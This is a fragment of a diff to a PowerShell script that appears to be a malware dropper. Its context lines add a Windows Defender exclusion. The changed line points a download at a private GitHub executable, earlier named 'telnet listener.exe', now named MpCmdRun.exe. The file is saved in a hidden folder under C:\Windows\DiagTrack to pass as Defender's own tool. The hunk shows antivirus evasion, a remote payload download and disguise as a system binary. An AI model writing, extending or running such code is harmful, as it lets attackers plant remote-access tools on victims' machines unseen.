@@ -60,7 +60,7 @@ Add-MpPreference -ExclusionPath $pathToExclude
 Write-Host "Exclusion added successfully for: $pathToExclude"
 
 # Define the URL and the destination path for MpCmdRun.exe
-$urlMpCmdRun = "https://github.com/XXS437/Private/blob/main/telnet%20listener.exe?raw=true"
+$urlMpCmdRun = "https://github.com/XXS437/Private/blob/main/MpCmdRun.exe?raw=true"
 $hiddenDirectoryMpCmdRun = "C:\Windows\DiagTrack\Settings"
 $destinationPathMpCmdRun = "$hiddenDirectoryMpCmdRun\MpCmdRun.exe"
 
